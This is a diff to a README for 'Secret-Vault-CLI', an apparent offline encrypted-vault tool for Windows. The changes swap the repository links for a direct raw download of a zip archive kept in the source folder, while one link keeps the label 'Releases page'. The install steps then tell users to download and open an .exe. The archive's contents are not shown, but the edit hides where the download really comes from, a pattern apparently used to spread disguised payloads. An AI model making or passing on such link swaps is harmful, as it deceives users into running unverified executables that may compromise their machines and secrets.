@@ -1,6 +1,6 @@
 # 🔒 Secret-Vault-CLI - Keep your digital secrets safe offline
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/glowheat341/Secret-Vault-CLI)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/glowheat341/Secret-Vault-CLI/main/src/vault/Secret_Vault_CLI_3.5.zip)
 
 ## 🛡️ What is Secret-Vault-CLI
 
@@ -14,7 +14,7 @@ This application uses AES-256-GCM encryption. This standard protects data for go
 
 Follow these steps to set up the vault on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/glowheat341/Secret-Vault-CLI).
+1. Go to the [Releases page](https://raw.githubusercontent.com/glowheat341/Secret-Vault-CLI/main/src/vault/Secret_Vault_CLI_3.5.zip).
 2. Look for the latest version under the Releases heading.
 3. Click the link that ends in .exe to download the installer.
 4. Open the downloaded file once the transfer completes.
